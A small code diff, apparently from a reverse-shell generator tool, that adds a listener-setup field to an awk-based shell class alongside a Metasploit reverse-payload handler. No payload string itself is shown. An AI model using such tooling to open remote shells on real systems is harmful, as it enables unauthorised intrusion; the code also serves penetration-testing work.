@@ -1,4 +1,4 @@
-from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, TTY_UPGRADE, msf_handler, LISTENER_FMT
+from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, TTY_UPGRADE, msf_handler, LISTENER_FMT, build_listener_setup
 
 
 class AwkGenerator(ShellGenerator):
@@ -17,4 +17,5 @@ class AwkGenerator(ShellGenerator):
             listener=LISTENER_FMT.format(lport=opts.lport),
             tty_upgrade=TTY_UPGRADE,
             msf_compat=msf_handler("payload/cmd/unix/reverse", opts.lhost, opts.lport),
+            listener_setup=build_listener_setup(opts.lhost, opts.lport),
         )
